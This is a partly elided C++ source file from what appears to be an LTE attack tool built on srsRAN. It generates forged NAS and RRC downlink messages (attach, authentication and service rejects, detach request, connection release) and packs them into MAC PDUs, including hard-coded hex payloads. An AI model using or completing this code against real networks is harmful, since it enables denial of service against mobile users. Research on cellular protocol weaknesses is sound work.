// MsgGenerator.cc
#include "include/MsgGenerator.h"
#include <cstdio>
#include <cstdlib>
#define PCAP_CRNTI (0x1001)
#define PCAP_TTI (666)

void MsgGenerator::gen_mac_pdu(AttackType type, uint8_t* payload, uint32_t* payload_len, uint32_t set_emm_cause, uint32_t set_esm_cause) {
    switch (type) {
        case ATTACH_REJECT:
        ...
        case PDN_REJECT:
            ...
            break;
        default:
            fprintf(stderr, "[ERROR] Unknown attack type in MsgGenerator: %d\n", static_cast<int>(type));
            *payload_len = 0;
...
bool MsgGenerator::build_dl_mac_pdu_from_nas(
...
bool MsgGenerator::build_dl_mac_pdu_from_rrc(
...
// ========== 消息生成函数（调用组合函数） ==========
void MsgGenerator::gen_identity_request_pdu(uint8_t* buffer, uint32_t* msg_len) {
...
/*
void MsgGenerator::gen_attach_reject_rrc_rel_pdu(uint8_t* buffer, uint32_t* msg_len) {
...
void MsgGenerator::gen_attach_reject_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
  gen_attach_reject_nas(nas_pdu);
...
void MsgGenerator::gen_pdn_connectivity_reject_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_authen_reject_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_authen_request_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_deactivate_eps_bearer_request_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_attach_accept_pdu(uint8_t* buffer, uint32_t* msg_len) {
    srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_sec_mod_comm_pdu(uint8_t* buffer, uint32_t* msg_len) {
    srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_detach_accept_pdu(uint8_t* buffer, uint32_t* msg_len)
{
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_detach_request_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_service_reject_pdu(uint8_t* buffer, uint32_t* msg_len) {
  srsran::unique_byte_buffer_t nas_pdu = srsran::make_byte_buffer();
...
void MsgGenerator::gen_rrc_connection_release_pdu(uint8_t* buffer, uint32_t* msg_len)
{
...
void MsgGenerator::gen_rrc_connection_reest_reject_pdu(uint8_t* buffer, uint32_t* msg_len)
{
...
void MsgGenerator::gen_pdn_connectivity_reject_nas(LIBLTE_BYTE_MSG_STRUCT* msg)
{
...
void MsgGenerator::gen_attach_reject_pdn_connectivity_reject_nas(srsran::unique_byte_buffer_t& msg)
{
...
void MsgGenerator::gen_attach_reject_nas(srsran::unique_byte_buffer_t& msg)
{
  LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT attach_reject;
  bzero(&attach_reject, sizeof(LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT));
  attach_reject.emm_cause = emm_cause;
...
void MsgGenerator::gen_identity_request_nas(srsran::unique_byte_buffer_t& msg) {
...
void MsgGenerator::gen_authen_reject_nas(srsran::unique_byte_buffer_t& msg)
{
...
void MsgGenerator::gen_authen_request_nas(srsran::unique_byte_buffer_t& msg)
{
...
void MsgGenerator::gen_deactivate_eps_bearer_request_nas(srsran::unique_byte_buffer_t& msg)
{
...
void MsgGenerator::gen_attach_accept_nas_plain(srsran::unique_byte_buffer_t& msg)
{
...
void MsgGenerator::gen_attach_accept_nas_inpro(srsran::unique_byte_buffer_t& msg)
{
...
void MsgGenerator::gen_sec_mod_comm_nas(srsran::unique_byte_buffer_t& msg)
{
  const char* nas_hex = "37A593064D00075D220302F070";
  hex_string_to_byte_array(nas_hex, msg->msg);
  msg->N_bytes = strlen(nas_hex) / 2;
}
void MsgGenerator::gen_detach_accept_nas(srsran::unique_byte_buffer_t& msg)
{
...
void MsgGenerator::gen_detach_request_nas(srsran::unique_byte_buffer_t& msg) {
  const char* hex = "0745045303";
  msg->N_bytes = strlen(hex) / 2;
  hex_string_to_byte_array(hex, msg->msg);
}
void MsgGenerator::gen_service_reject_nas(srsran::unique_byte_buffer_t& msg) {
...
void MsgGenerator::hex_string_to_byte_array(const char *hex_string, uint8_t *byte_array) {
    size_t len = strlen(hex_string);
    for (size_t i = 0; i < len; i += 2) {
        sscanf(hex_string + i, "%2hhx", &byte_array[i / 2]);
    }
}
void MsgGenerator::print_hex_stream(const uint8_t* data, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        printf("%02X", data[i]);
    }
    printf("\n");
}
void MsgGenerator::hexdump(uint8_t* data, size_t length) {
...
void MsgGenerator::uint16_to_uint8(uint16_t i, uint8_t* buf)
{
  buf[0] = (i >> 8) & 0xFF;
  buf[1] = i & 0xFF;
}

void MsgGenerator::uint24_to_uint8(uint32_t i, uint8_t* buf)
{
  buf[0] = (i >> 16) & 0xFF;
  buf[1] = (i >> 8) & 0xFF;
  buf[2] = i & 0xFF;
...
bool MsgGenerator::build_rrc_dl_info_transfer(
  srsran::unique_byte_buffer_t nas_pdu,
    srsran::unique_byte_buffer_t& rrc_pdu)
{
  dl_dcch_msg_s dl_dcch_msg;
...
bool MsgGenerator::build_rrc_dl_info_transfer_rrc_con_rel(
    srsran::unique_byte_buffer_t nas_pdu,
      srsran::unique_byte_buffer_t& rrc_pdu)
  {
    dl_dcch_msg_s dl_dcch_msg;
...
bool MsgGenerator::add_pdcp_header(
    srsran::unique_byte_buffer_t& rrc_pdu,
    uint32_t pdcp_sn,
...
bool MsgGenerator::build_rlc_am_pdu(
...
bool MsgGenerator::build_mac_pdu(
    uint8_t* rlc_sdu,
    size_t rlc_sdu_len,
    uint8_t* mac_buffer,
